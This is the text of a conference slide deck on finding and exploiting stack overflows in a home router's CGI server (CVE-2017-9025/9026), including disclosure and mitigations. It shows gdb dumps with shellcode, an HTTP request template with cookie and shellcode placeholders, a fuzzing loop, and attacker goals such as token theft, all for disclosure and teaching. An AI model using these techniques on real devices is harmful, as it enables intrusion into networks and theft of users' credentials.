(gdb) x/100wx $sp+0x128
0x7f8e1f78:
0x0f242f3c
0xe001fdff
0xe001272b
0x06282728
0x7f8e1f88:
0x0224ffff
0x01015710
0xa2af0c01
0xa48fffff
0x7f8e1f98:
0x0f24ffff
0xe001fdff
0xafaf2778
0x0e3ce0ff
0x7f8e1fa8:
0xce35697a
0xaeaf697a
0x0d3ce4ff
0xad35080a
...
0x7f8e2038:
0x41414141
0x41414141
0x41414141
0x41414141
0x7f8e2048:
0x41414141
0x41414141
0x41414141
0x41414141
0x7f8e2058:
0x41414141
0x41414141
0x41414141
0x41414141
0x7f8e2068:
0x41414141
0x41414141
0x41414141
0x41414141
0x7f8e2078:
0x41414141
0x41414141
0x3e5126d0
0x0043b8d0
Program received signal SIGSEGV, Segmentation fault.
0x3e5126d0 in ?? ()
Return address on the stack
Stack pointer!
Located
Firmware
Password
Shell
Crash
Overflow
EIP!
$ ls exploit
ls: exploit: No such file or directory
Restrictions with sprintf(“) :
●
No nulls
●
output buffer follows “” format
Return to
Static
Null In 
Address
Use Format 
Values
Executable
Main binary
Heap
ret2libc
Stack
Located
Firmware
Password
Shell
Crash
Overflow
EIP!
Exploit
buff = ["POST /protocol.csp?fname=security&opt=userlock&"
                           "username=guest&function=get HTTP/1.1",
        "Host: 192.168.1.1",
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        "If-Modified-Since: 0",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel...",
        "Accept: */*",
        "Referer: http://192.168.1.1/",
        "Accept-Encoding: gzip, deflate, sdch",
        "Accept-Language: en-US,en;q=0.8,ru;q=0.6",
        "Content-length: [[shelllen]]",
        "Cookie: [[cookies]]",
        "",
        "",
        "[[shell]]"] 
>>> for i in range(1, 20000, 4):
       testPost(cookie= ”A” * i)
More details: debugtrap.com/2017/05/09/tm06-vulnerabilities/
CVE-2017-9025
Located
Firmware
Password
Shell
Crash 2
lw      $v0, 0x40+var_1C($sp)
nop
lw      $t9, 0x10($v0)
lw      $a0, 0x40+var_1C($sp)
jalr    $t9              # cgi_tab_alloc
...
sw      $v0, 0x40+cgi_tab($sp)
addiu   $a1, (aCookie - 0x550000)  # "Cookie"
jalr    $t9               # ht_header_find
nop
lw      $gp, 0x40+var_28($sp)
sw      $v0, 0x40+cookie_value($sp)
...
lw      $v1, 0x40+cgi_tab($sp)
li      $v0, 0x16858
addu    $v0, $v1, $v0     # cgi_tab+0x16858
move    $a0, $v0          # dest
lw      $a1, 0x40+cookie_value($sp)  # src
la      $t9, strcpy
nop
jalr    $t9 ; strcpy
.text:00521A90 >>
.text:00521B9C >>
10 cgi_tab = 
    malloc(sizeof(cgi_tab));
// sizeof(inner buffer) = 1024
20 cookie_value = 
   ht_header->
        ht_header_find(“Cookie”);
30 src = cookie_value;
40 dst = cgi_tab+0x16858
50 strcpy(dst, src);
// so... we send 1036 bytes!
Located
Firmware
Password
Shell
Crash 2
Overflow
Located
Firmware
Password
Shell
Crash 2
Overflow
EIP!
(gdb) x/5i 0x00521BD4
   0x521bd4:
move
a0,v0
   0x521bd8:
lw
a1,40(sp)
   0x521bdc:
lw
t9,-28472(gp) // strcpy
   0x521be0:
nop
   0x521be4:
jalr
t9
(gdb) x /5i $pc-8
   0x4136a8:
lw
t9,27748(v0)
   0x4136ac:
lw
a0,28(sp)
=> 0x4136b0:
jalr
t9 // cgi_tab->fnc()
   0x4136b4:
nop
   0x4136b8:
lw
gp,16(sp)
cgi_tab->fnc()
1
2
Cookie & fcnptr
Preamble 
       &
Shellcode
Located
Firmware
Password
Shell
Crash 2
Overflow
EIP!
Exploit
Lots of top site still don’t use SSL: Google transparency report
Demo!
Located
Firmware
Password
Shell
Crash 2
Overflow
EIP!
Exploit
Attack
Via the browser XSRF
From within 
the enclave
From the 
external WiFi
$ ps -ef | grep attack
  503 91038 73200   0  5:47PM ttys001    0:00.00 ./my_attack
Trojan.AndroidOS.Switcher
Why do this?
The unboxing
We want bugs!
The End
$ cat agenda | wc -l
1
That was fun...
CVE-2017-9026:
Specific: snprintf($sp+0x128, 256, “”, fname);
General:  Stack canaries
CVE-2017-9025:
Specific: strncpy(dst, src, 1024);
General:  (ctx->fcn ^ canary)(param);
          Windows: DecodePointer
NSA has a patent on that. Sorry!
# cat /dev/attack_cases
 jWs"
●
Gain an attack proxy for attribution obfuscation
●
Steal user information such as authentication tokens
●
Manipulate user activity… iframes!
●
Foothold into enterprise or private networks
#12 +(3869)- [X]
 ok, here's what we do
 we break into AOL HQ
 and instead of the AOL setup utility, we put metallica 
       mp3s on all of the startup cds
$ cat bug | sed 's/exploit/vendor/g'
vendor give a shell
Super polite
Entire product team off for the spring festival (Chinese New Year)
Received a personal update before it was made generally available.
“We have transmit your email and issue to our product 
team. But we feel sorry that we would inform you until 
2/8 because product team has day off due for Spring 
Festival.” - PI:EMAIL
$ echo "learned $?"
learned 0
Vendors do respond!
Install OpenWRT on the device.
Exploiting routers is fun.
People still use strcpy and sprintf - like they did in 1999!
“Don’t roll your own crypto”
      => “Don’t roll your own CGI webserver”
Located
Firmware
Password
Shell
Crash 2
Overflow
EIP!
Exploit
Attack
Lessons
Email:   PI:EMAIL 
blog:      debugtrap.com
Twitter: @H4ckerLife
Ačiū! Спасибо! Thank you!
Questions and Answers
                ...Catch me in the halls or online!
Mikhail Sosonkin
Located
Firmware
Password
Shell
Crash 2
Overflow
EIP!
Exploit
Attack
Lessons
Profit?